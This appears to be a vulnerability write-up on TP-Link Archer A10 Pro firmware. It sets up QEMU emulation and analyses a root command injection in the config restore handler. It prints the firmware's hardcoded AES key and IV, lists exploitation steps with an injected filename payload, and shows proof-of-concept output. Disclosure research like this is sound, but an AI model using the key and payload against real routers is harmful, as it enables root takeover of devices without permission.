# TP-Link Archer A10 Pro Firmware Lua Command Injection Vulnerability Analysis

## Firmware Information

- **Device**: TP-Link Archer A10 Pro
- **Architecture**: MIPS32 rel2 Little-Endian (mipsel)
- **C Library**: uClibc 0.9.33.2
- **Lua**: 5.1 (TP-Link custom build)
- **Web Framework**: LuCI (modified OpenWrt variant)
- **Filesystem**: SquashFS
- **Total Lua Files**: 195

---

## QEMU System-Mode Emulation

### Environment Setup

```bash
# Download MIPS Little-Endian kernel and disk image
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
```

### Start QEMU

```bash
qemu-system-mipsel -M malta \
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -drive file=debian_squeeze_mipsel_standard.qcow2,if=ide \
    -append "root=/dev/sda1 console=ttyS0 init=/bin/bash" \
    -nographic \
    -net nic -net tap,ifname=tap0,script=no,downscript=no \
    -m 256
```

> `init=/bin/bash` skips init scripts to avoid hanging at "Setting console screen modes".

### VM Initialization

```bash
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs devtmpfs /dev

ip addr add 192.168.122.10/24 dev eth0
ip link set eth0 up
ip route add default via 192.168.122.1
```

### Transfer Firmware Files

scp (requires compatibility flags):

```bash
scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -r ./squashfs-root/ root@192.168.122.10:/root/
```

Then chroot:

```bash
mount -t proc /proc squashfs-root/proc
mount --rbind /sys  squashfs-root/sys
mount --rbind /dev  squashfs-root/dev
chroot squashfs-root /bin/sh
```

---

## Vulnerability Analysis

### Vulnerability 1: firmware.lua:961 Config Restore Filename Command Injection

**File**: `usr/lib/lua/luci/controller/admin/firmware.lua`
**Function**: `config_restore()`

#### Vulnerable Code

Decompiled `firmware.lua.unluac` Lines 960-962:

```lua
for _, filename in nixio.fs.dir("/tmp/userconfig/config") do
    luci.sys.exec("cp -f /tmp/userconfig/config/" .. filename .. "  /tmp/restorecfg/config/")
end
```

**Issue**: `filename` is directly concatenated into a shell command without any escaping or validation.

#### luci.sys.exec Underlying Implementation

```lua
-- luci/sys.lua:113
exec = luci.util.exec

-- luci/util.lua:504
function exec(cmd)
    local pp = io.popen(cmd)    -- Underlying call: /bin/sh -c "cmd"
    local data = pp:read("*a")
    pp:close()
    return data
end
```

`io.popen(cmd)` invokes `/bin/sh -c "cmd"`, where the shell interprets metacharacters such as `;`, `|`, `$()`, and `` ` ``.

#### Complete config_restore Data Flow

Reconstructed from `firmware.lua.correct` bytecode constants:

```
User uploads config.bin
  → Parse binary header (partition lengths, MD5)
  → Split into userconf1.bin, userconf2.bin, commonconf.bin
  → MD5 verification
  → crypto.dec_file_entry(userconf1.bin, userconf1.xml)      ← AES-256-CBC decryption
  → mkdir -p /tmp/restorecfg /tmp/userconfig
  → xmlToFile(userconf1.xml, /tmp/restorecfg)                ← XML → UCI config files
  → nvrammanager -r ori-userconf1.bin -p user-config1        ← Read original config
  → crypto.dec_file_entry(ori-userconf1.bin, ori-userconf1.xml)
  → xmlToFile(ori-userconf1.xml, /tmp/userconfig)
  → Iterate /tmp/userconfig/config/*                          ← Vulnerability trigger point
  → "cp -f .../" .. filename .. " .../config/"               ← Command injection!
  → convertFileToXml → enc_file_entry → Write back to nvram
```

#### Encryption Module: luci.model.crypto

Hardcoded key extracted from `crypto.lua` bytecode:

```
Algorithm:  AES-256-CBC
Key:        2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836
IV:         360028C9064242F81074F4C127D299F6
Fallback:   /etc/secretkey
```

`dec_file_entry` internal flow:

```
dec_file_entry(input, output)
  ├─ crypt_used_openssl()   ← Check for /usr/bin/openssl
  ├─ openssl available:
  │     openssl aes-256-cbc -d -in "input" -K <key> -iv <iv> | openssl zlib -d
  │     → dump_to_file(output)
  └─ openssl unavailable:
        wolfssl_enc_dec_file()  ← luarsa module's aes_dec
```

`xmlToFile` is a function in the `uci.so` C module (MIPS compiled), which parses XML into UCI configuration files under the `/config/` directory.

#### Exploitation Method

1. Obtain a legitimate backup file `config.bin`
2. Decrypt with the hardcoded key:
   ```bash
   openssl aes-256-cbc -d \
       -K 2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836 \
       -iv 360028C9064242F81074F4C127D299F6 \
       -in config.bin | openssl zlib -d > config.xml
   ```
3. Modify the XML `<package name="...">` to inject shell metacharacters:
   ```xml
   <package name="a;touch hack.txt;">
   ```
4. Re-encrypt and upload to the router's web interface to restore configuration
5. `xmlToFile` creates the malicious package name as a filename
6. `firmware.lua:961` iterates over the files and executes the injected command as root

#### Other Locations with the Same Pattern

| Line | Function | Command |
|------|----------|---------|
| 126 | hide_info | `rm -f /tmp/backupcfg/config/` + filename |
| 251-254 | config_backup | `rm -f /tmp/backupcfg/config/` + filename |
| 517-520 | config_backup | Same as above |
| 1121-1125 | config_restore | `nvrammanager -e -p ` + partition name |
| 1129-1135 | config_restore | `nvrammanager -w .../ori-backup-` + partition name |

---

## PoC Verification

### Script: poc/poc_firmware_inject.lua

### Execution Result

```
# lua /poc/poc_firmware_inject.lua
[1] Modules: sys=OK crypto=OK nixio=OK
[2] crypto: OK
[3] /tmp/userconfig/config/:
a;touch hack.txt;
network
system
[4] firmware.lua:961:
    cp -f /tmp/userconfig/config/system  /tmp/restorecfg/config/
    cp -f /tmp/userconfig/config/network  /tmp/restorecfg/config/
    cp -f /tmp/userconfig/config/a;touch hack.txt;  /tmp/restorecfg/config/
```

The shell splits the command at `;`:

1. `cp -f /tmp/userconfig/config/a` — insufficient arguments, fails
2. **`touch hack.txt`** — silently executed as root
3. `/tmp/restorecfg/config/` — Permission denied (attempts to execute a directory)

`hack.txt` was created, confirming command injection.

---
